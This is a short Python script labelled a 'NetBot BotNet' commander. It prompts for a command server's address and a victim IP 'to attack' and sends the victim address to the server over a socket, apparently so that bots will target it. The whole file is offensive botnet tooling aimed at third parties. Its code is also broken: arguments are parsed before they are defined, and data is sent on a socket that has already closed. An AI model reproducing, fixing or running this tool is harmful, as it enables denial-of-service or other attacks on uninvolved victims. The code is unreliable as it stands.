#!/bin/python3
import socket, os, sys, threading, argparse

# Arguments
parser = argparse.ArgumentParser(prog="NetBot BotNet", description="Python botnet commander")
args = parser.parse_args()
parser.add_argument('-ip', dest='ip', required=True)
parser.add_argument('-port', dest='port', required=True)
i_p = args.ip
po_rt = args.port


# Define class & def
class color():
    end = '\033[00m'
    green = '\033[38;5;82m'
    purple = '\033[1;35m'
    red = '\033[38;5;196m'

def connect(host, port, vict):
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, int(port)))
            data = s.recv(1024)
        print(repr(data))
        s.send(bytes(f"{vict}", "utf-8"))

def launch():
    while True:
        socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        HOST = input(color.green + "[!] Enter the target IP address: " + color.end)
        PORT = input(color.green + "[!] Enter the target port: " + color.end)
        VICTIM = input(color.green + "[!] Enter the IP victim to attack: " + color.end)
        try:
            connect(HOST, PORT, VICTIM)
        except socket.error:
            print(color.red + "[!] The client cannot connect to the server " + color.end)
            return

# General vars
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


# Banner
f = open('banner.text', 'r')
banner = f.read()

try:
    os.system('clear')
    print(color.purple + banner + color.end)
    launch()

except KeyboardInterrupt:
    os.system("clear")
    print(color.purple + banner + color.end)
    print(color.red + "[!] The script was interrupt!" + color.end)
    sys.exit(0)